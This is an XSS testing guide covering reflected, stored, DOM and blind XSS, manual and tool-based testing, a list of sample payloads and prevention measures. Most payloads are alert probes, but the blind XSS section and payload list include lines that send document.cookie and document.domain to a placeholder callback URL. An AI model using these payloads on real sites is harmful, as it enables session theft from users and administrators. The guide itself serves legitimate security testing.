# XSS (Cross-Site Scripting) Types, Methods, and Testing Guide

A detailed guide on **XSS types**, **manual testing techniques**, and **automation tools** to help you identify and mitigate XSS vulnerabilities.

---

## **Types of XSS**

1. **Reflected XSS (Non-persistent)**  
   - **Description**: Occurs when user input is immediately reflected back in the web page without proper sanitization or validation.
   - **Example**: Search boxes, URL query parameters, etc.

2. **Stored XSS (Persistent)**  
   - **Description**: Occurs when the injected payload is stored on the server (in a database or log file), and is reflected back when the page is loaded.
   - **Example**: Comment sections, forums, or user profile data.

3. **DOM-based XSS**  
   - **Description**: Occurs when the XSS is triggered purely by client-side code manipulating the DOM (Document Object Model) in the browser without server-side involvement.
   - **Example**: URL fragments, JavaScript-based applications (SPA - Single Page Applications).

4. **Blind XSS (Out-of-band XSS)**  
   - **Description**: In blind XSS, the payload does not trigger an immediate response but is stored on the server. The attacker is notified through a secondary vector, often via callback, once the payload is triggered.
   - **Example**: An admin panel receiving malicious input that gets triggered when an admin views the data.

---

## **Methods of Finding XSS Vulnerabilities**

### 1. **Manual Testing Techniques**

#### **A. Input Fields & URL Parameters**
- **Where to test**: 
  - Search forms, login forms, feedback forms, comment sections, query parameters in the URL, and any place where user input is received.
  
- **Manual Approach**:
  - Input payloads like `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, or `"><script>alert(1)</script>` into various form fields or URL query parameters.
  - Observe the page’s response and check if the script gets executed.

#### **B. Event Handlers**
- **Where to test**: 
  - Image tags (`<img>`), links (`<a>`), buttons, and other elements where JavaScript event handlers might be attached (`onclick`, `onmouseover`, etc.).
  
- **Manual Approach**:
  - Insert event handler payloads like `<img src="x" onerror="alert(1)">` or `<a href="#" onclick="alert(1)">Click Me</a>`.
  - Test elements that might accept URLs as input, such as href attributes in `<a>` tags.

#### **C. Reflected XSS via HTTP Headers**
- **Where to test**: 
  - `Referer`, `User-Agent`, `Location`, and other HTTP headers.
  
- **Manual Approach**:
  - Use tools like **Burp Suite** or **Postman** to modify HTTP headers and insert payloads (e.g., `Referer: <script>alert(1)</script>`).

#### **D. Stored XSS in Databases**
- **Where to test**: 
  - Comment sections, profile pages, or any form of persistent data entry.
  
- **Manual Approach**:
  - Input payloads into text areas or forms that are stored in the database (e.g., comment sections or user profile information).
  - Reload the page and check if the payload executes.

#### **E. DOM-based XSS (Client-Side Injection)**
- **Where to test**: 
  - JavaScript-based applications or dynamically generated content using JavaScript.
  
- **Manual Approach**:
  - Analyze JavaScript code (e.g., using browser developer tools) to identify insecure DOM manipulation that does not sanitize input.
  - Inject payloads via browser console or URL fragments (e.g., `#<script>alert(1)</script>`).

#### **F. Blind XSS**
- **Where to test**: 
  - Admin panels, backend applications, or systems that accept user input and store it for later use.
  
- **Manual Approach**:
  - Inject a payload like `<script>new Image().src='http://your-xss-report-url/'+document.domain;</script>` into forms or fields that store data without triggering an immediate response.
  - The payload will execute when an admin or another user accesses the stored data, and you'll get a callback notification.

---

### 2. **Automated Tools and Techniques**

#### **A. Burp Suite (Scanner & Intruder)**
- **Where to use**: Any page that accepts user input.
- **How to Use**:
  - Intercept traffic in Burp Suite and use **Intruder** to fuzz for common XSS payloads.
  - Use **Scanner** to automatically scan for reflected, stored, and DOM-based XSS.

#### **B. OWASP ZAP (Zed Attack Proxy)**
- **Where to use**: Any form or input field.
- **How to Use**:
  - Run a **Passive Scan** to detect reflected XSS or use **Active Scan** to actively look for vulnerabilities.
  - Use **Fuzzer** to automate testing of user input fields.

#### **C. XSS.report**
- **Where to use**: Any place where you suspect Blind XSS vulnerabilities (Admin panels, comment sections).
- **How to Use**:
  - Use **XSS.report** to track Blind XSS attacks by redirecting payloads to your **XSS.report** endpoint, which will notify you once the payload is executed on the target server (e.g., when an admin views the data).

#### **D. Nuclei (Template-based Scanning)**
- **Where to use**: Web application endpoints or URL parameters.
- **How to Use**:
  - Run a Nuclei scan with XSS-specific templates to automatically find reflected or stored XSS vulnerabilities.

#### **E. XSStrike**
- **Where to use**: Input fields, URL parameters.
- **How to Use**:
  - Use `XSStrike` to fuzz input fields and try various payloads, including advanced XSS payloads.
  - It uses techniques like **boilerplate injection** to bypass filters.

#### **F. Wapiti**
- **Where to use**: Web applications (general-purpose scanner).
- **How to Use**:
  - Run Wapiti against web applications to identify reflected and stored XSS vulnerabilities by testing form fields, URL parameters, and other user inputs.

---

## **Common XSS Payloads for Testing**

1. **Reflected XSS Payloads**:
    - `<script>alert(1)</script>`
    - `"><script>alert(1)</script>`
    - `<img src="x" onerror="alert(1)">`

2. **Stored XSS Payloads**:
    - `<script>alert(document.cookie)</script>`
    - `<img src="x" onerror="alert(document.domain)">`

3. **DOM-based XSS Payloads**:
    - `javascript:alert(1)`
    - `"><img src=x onerror=alert(1)>`

4. **Blind XSS Payloads**:
    - `<script>new Image().src='http://your-xss-report-url/'+document.domain;</script>`
    - `<script>fetch('http://your-xss-report-url/'+document.cookie);</script>`

---

## **How to Prevent XSS**

- **Sanitize Inputs**: Always sanitize input from the user to remove dangerous characters such as `<`, `>`, `"`, `'`, etc.
- **Use Content Security Policy (CSP)**: A strong CSP can help mitigate the impact of XSS by blocking inline scripts.
- **HttpOnly Cookies**: Set the `HttpOnly` flag on cookies to prevent JavaScript from accessing sensitive session data.
- **Use Safe JavaScript Libraries**: Use libraries that automatically escape user inputs before placing them in the DOM, such as **DOMPurify**.
- **Input Validation**: Use allow-lists (whitelists) to validate inputs against expected patterns.

---

### **Final Tip**
**Manual Testing** is key for discovering new, unanticipated XSS vectors, while **automation** speeds up repetitive scanning tasks. Combining both methods can increase your chances of finding vulnerabilities faster.

---
